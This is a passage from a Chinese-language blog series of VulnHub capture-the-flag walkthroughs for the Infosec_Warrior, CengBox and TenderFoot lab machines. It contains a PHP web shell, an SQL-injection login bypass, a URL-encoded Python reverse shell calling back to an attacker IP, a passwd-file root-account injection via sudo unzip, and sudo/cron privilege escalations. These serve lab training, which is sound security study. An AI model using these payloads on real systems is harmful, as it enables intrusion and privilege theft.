bionic</span><br><span class="line">bionic</span><br></pre></td></tr></table></figure><p>输入命令之后ssh断开连接</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/10.png" alt="" /></p><p>查看ck04用户的默认Shell</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/11.png" alt="" /></p><p>构造反弹shell脚本并执行</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/12.png" alt="" /></p><p>获取tty</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/13.png" alt="" /></p><p>查看ck04用户的sudo权限并利用</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/14.png" alt="" /></p><p>查看bla用户的sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/15.png" alt="" /></p><p>使用unzip命令覆盖passwd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">$6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1</span><br><span class="line">echo &#39;test:$6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">zip new.zip passwd</span><br><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;unzip new.zip -d &#x2F;etc</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/16.png" alt="" /></p><hr /><blockquote><p>python2 input()</p></blockquote><p>python2的函数input()会执行输入的数据，插入python命令即可Getshell或反弹Shell，而使用函数raw_input()则不会执行命令</p><p>参考资料</p><blockquote><p><a href="https://hack-tips.com/2020/04/13/vulnhub-infosecwarrior-ctf-2020-02walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="infosec_warrior03"><a class="markdownIt-Anchor" href="#infosec_warrior03"></a> <a href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-03,449/">Infosec_Warrior03</a></h1><p><code>2020/09/21 19:24:32</code></p><h2 id="寻找靶机ip-16"><a class="markdownIt-Anchor" href="#寻找靶机ip-16"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.110.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/00.png" alt="" /></p><h2 id="端口扫描-32"><a class="markdownIt-Anchor" href="#端口扫描-32"></a> 端口扫描</h2><p><code>nmap -p- -A -T5 -v -n 192.168.110.6</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/01.png" alt="" /></p><h2 id="web路径扫描-15"><a class="markdownIt-Anchor" href="#web路径扫描-15"></a> Web路径扫描</h2><p><code>dirb http://192.168.110.6/</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/02.png" alt="" /></p><h2 id="漏洞利用-32"><a class="markdownIt-Anchor" href="#漏洞利用-32"></a> 漏洞利用</h2><p>访问<code>http://192.168.110.6/phpMyAdmin/</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/03.png" alt="" /></p><p>使用弱口令登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:root</span><br><span class="line">password:root</span><br></pre></td></tr></table></figure><p>查询mysql.user中的账户信息</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/04.png" alt="" /></p><p>得到两个账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">krishna:4DC8EC6204F12795FE54CC79FFA2A8579A947D04</span><br></pre></td></tr></table></figure><p>进行md5查询之后得到明文口令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:root</span><br><span class="line">krishna:infosec</span><br></pre></td></tr></table></figure><p>尝试使用<code>krishna:infosec</code>登入SSH服务</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/05.png" alt="" /></p><h2 id="权限提升-32"><a class="markdownIt-Anchor" href="#权限提升-32"></a> 权限提升</h2><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/06.png" alt="" /></p><p>使用gcc进行提权</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/07.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/08.png" alt="" /></p><p>使用gcc进行提权</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/09.png" alt="" /></p><hr /><blockquote><p>Shell脚本提权与空格</p></blockquote><p>使用shell脚本进行sudo/suid提权时，参数中带有空格则需要使用引号</p><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/infosecwarrior-ctf-2020-03-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="cengbox"><a class="markdownIt-Anchor" href="#cengbox"></a> <a href="https://www.vulnhub.com/entry/cengbox-1,475/">CengBox</a></h1><p><code>2020/10/25 16:31:59</code></p><h2 id="寻找靶机ip-17"><a class="markdownIt-Anchor" href="#寻找靶机ip-17"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/00.png" alt="" /></p><h2 id="端口扫描-33"><a class="markdownIt-Anchor" href="#端口扫描-33"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -A -T5 192.168.1.104</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/01.png" alt="" /></p><h2 id="web路径扫描-16"><a class="markdownIt-Anchor" href="#web路径扫描-16"></a> Web路径扫描</h2><p><code>gobuster dir -u http://192.168.1.104 -w /usr/share/wordlists/dirb/big.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/02.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/03.png" alt="" /></p><h2 id="漏洞利用-33"><a class="markdownIt-Anchor" href="#漏洞利用-33"></a> 漏洞利用</h2><p>访问 <code>http://192.168.1.104/masteradmin/login.php</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/04.png" alt="" /></p><p>尝试SQL注入绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; or 1#</span><br><span class="line">passwrod&#x3D;1</span><br></pre></td></tr></table></figure><p>绕过登录，跳转至 <code>http://192.168.1.104/masteradmin/upload.php</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/05.png" alt="" /></p><p>尝试上传shell.php，返回错误信息</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/06.png" alt="" /></p><p>更改文件名为shell.php.ceng，上传成功</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/07.png" alt="" /></p><p>WebShell的内容为 <code>&lt;?php @system($_GET[&quot;cmd&quot;]);?&gt;</code></p><p>WebShell存放路径为 <code>/uploads/shell.php.ceng</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/08.png" alt="" /></p><p>存在python3环境</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/09.png" alt="" /></p><p>使用WebShell进行反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9908</span><br><span class="line">curl http:&#x2F;&#x2F;192.168.1.104&#x2F;uploads&#x2F;shell.php.ceng?cmd&#x3D;python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%27192.168.1.109%27%2C9908%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27&#x2F;bin&#x2F;bash%27%2C%27-i%27%5D%29%3B%22</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/10.png" alt="" /></p><h2 id="权限提升-33"><a class="markdownIt-Anchor" href="#权限提升-33"></a> 权限提升</h2><p>获取tty, 查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">uname -a</span><br><span class="line">cat &#x2F;etc&#x2F;*release</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/11.png" alt="" /></p><p>查看数据库信息<br /><code>cat /var/www/html/masteradmin/db.php</code><br />得到数据库账户信息 <code>root:SuperS3cR3TPassw0rd1!</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/12.png" alt="" /></p><p>进入数据库查看Web账户信息<br /><code>mysql -u root -pSuperS3cR3TPassw0rd1! -e 'select * from cengbox.admin;'</code><br />得到Web账户信息 <code>masteradmin:C3ng0v3R00T1!</code><br /><img src="/images/vulnhub_walkthrough_set/CengBox/img/13.png" alt="" /></p><p>查看账户信息<br /><code>cat /etc/passwd</code></p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/14.png" alt="" /></p><p>尝试登入cengover账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh cengover@192.168.1.104</span><br><span class="line">C3ng0v3R00T1!</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/15.png" alt="" /></p><p>在pspy目录开启HTTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 9900&amp;</span><br></pre></td></tr></table></figure><p>下载并使用pspy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">curl -O http:&#x2F;&#x2F;192.168.1.109:9900&#x2F;pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">.&#x2F;pspy64&amp;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/16.png" alt="" /></p><p>存在root的计划任务<br />查看脚本文件</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/17.png" alt="" /></p><p>拥有写入权限<br />可以写入反弹Shell命令</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/18.png" alt="" /></p><p>监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8087</span><br></pre></td></tr></table></figure><p>获取root权限</p><p><img src="/images/vulnhub_walkthrough_set/CengBox/img/19.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/cengbox-1-vulnhub-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="tenderfoot-1"><a class="markdownIt-Anchor" href="#tenderfoot-1"></a> <a href="https://www.vulnhub.com/entry/tenderfoot-1,581/">TenderFoot-1</a></h1><p><code>2020/10/28 21:29:04</code></p><h2 id="寻找靶机ip-18"><a class="markdownIt-Anchor" href="#寻找靶机ip-18"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/00.png" alt="" /></p><h2 id="端口扫描-34"><a class="markdownIt-Anchor" href="#端口扫描-34"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.108</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/01.png" alt="" /></p><h2 id="web路径扫描-17"><a class="markdownIt-Anchor" href="#web路径扫描-17"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.108/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/02.png" alt="" /></p><h2 id="漏洞利用-34"><a class="markdownIt-Anchor" href="#漏洞利用-34"></a> 漏洞利用</h2><p>访问 <code>http://192.168.1.108/</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/03.png" alt="" /><br />提示需要进行路径枚举</p><p>查看源代码得到提示 <code>/robots.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/04.png" alt="" /></p><p><code>/robots.txt</code> 提示路径 <code>/hint</code><br />访问<code>/hint</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/05.png" alt="" /><br />存在HTML注释中存在Base32编码<br />解码结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> ____________________</span><br><span class="line">| N0thing Here!      |</span><br><span class="line">| Try something else!|</span><br><span class="line"> --------------------</span><br><span class="line">Enumerate more :)�</span><br></pre></td></tr></table></figure><p>继续枚举路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/06.png" alt="" /></p><p>访问 <code>/fotocd</code><br />HTML注释中存在BrainFuck编码</p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/07.png" alt="" /></p><p>解码结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">JDk5OTkwJA&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Did you found username ?</span><br><span class="line">if yes:</span><br><span class="line">    Then you have cred. of one user, enter into user account </span><br><span class="line">    by ssh port. syntax:&#123;ssh username@IP&#125;</span><br><span class="line">if not:</span><br><span class="line">    Then enumerate more :)</span><br><span class="line">    G00D LUCK !</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#39;JDk5OTkwJA&#x3D;&#x3D;&#39; | base64 -d</span><br><span class="line">$99990$</span><br></pre></td></tr></table></figure><p>继续枚举其他类型WEB文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt -x .html,.php,.css,.js</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/08.png" alt="" /></p><p>访问 <code>/entry.js</code><br />内容为 <code>monica</code></p><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh monica@192.168.1.108</span><br><span class="line">$99990$</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/09.png" alt="" /></p><h2 id="权限提升-34"><a class="markdownIt-Anchor" href="#权限提升-34"></a> 权限提升</h2><p>得到提示信息</p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/10.png" alt="" /></p><p>访问 <code>/fotocd/0x0343548764</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/11.png" alt="" /></p><p>下载并解压ZIP文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.1.108&#x2F;fotocd&#x2F;0x0343548764&#x2F;joey.zip</span><br><span class="line">unzip joey.zip</span><br><span class="line">#9175</span><br></pre></td></tr></table></figure><p>得到两个文件: <code>gift.zip</code>, <code>note.txt</code><br />note.txt的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Not this time DUDE!</span><br><span class="line"></span><br><span class="line">Just G00GLE and learn how to crack zip passwords :)</span><br><span class="line"></span><br><span class="line">you will learn new thing!</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>破解gift.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip gift.zip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u</span><br></pre></td></tr></table></figure><p>得到密码为 <code>h4ck3d</code></p><p>解压后得到 <code>gift.txt</code>，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Hahaha! there is no gift !</span><br><span class="line">Your Bad Luck!</span><br><span class="line"></span><br><span class="line">But what happened if you don&#39;t get gift.</span><br><span class="line"></span><br><span class="line">Take a hint from my side, which may help you to solve this box further.</span><br><span class="line"></span><br><span class="line">I make a binary to get another user&#39;s shell,</span><br><span class="line">Just google, command for search&#x2F;find SUID or binaries and figure it out how to execute this binary.</span><br><span class="line"></span><br><span class="line">G00D LUCK! :)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>搜索SUID文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>找到文件 <code>/opt/exec/chandler</code><br />执行后用户身份变为 <code>chandler</code></p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/12.png" alt="" /></p><p>查看提示信息</p><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/13.png" alt="" /></p><p>Base32解码的结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd:Y0uCr4ckM3</span><br></pre></td></tr></table></figure><p>SSH登入chandler账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh chandler@192.168.1.108</span><br><span class="line">Y0uCr4ckM3</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/14.png" alt="" /></p><p>进行sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;ftp</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/15.png" alt="" /></p><hr /><blockquote><p>SUDO &amp; GID</p></blockquote><p>使用脚本切换用户身份时，只是简单地更换了UID与GID，并没有添加用户所属的groups，所以不能直接进行sudo提权而是需要使用SSH登入之后再提权</p><p>参考资料</p><blockquote><p><a href="https://www.infosecarticles.com/tenderfoot-vulnhub-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="symfonos-2"><a class="markdownIt-Anchor" href="#symfonos-2"></a> <a href="https://www.vulnhub.com/entry/symfonos-2,331/">symfonos 2</a></h1><p><code>2020/10/28 08:21:48</code></p><h2 id="寻找靶机ip-19"><a class="markdownIt-Anchor" href="#寻找靶机ip-19"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/00.png" alt="" /></p><h2 id="端口扫描-35"><a class="markdownIt-Anchor" href="#端口扫描-35"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.107</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/01.png" alt="" /></p><h2 id="web路径扫描-18"><a 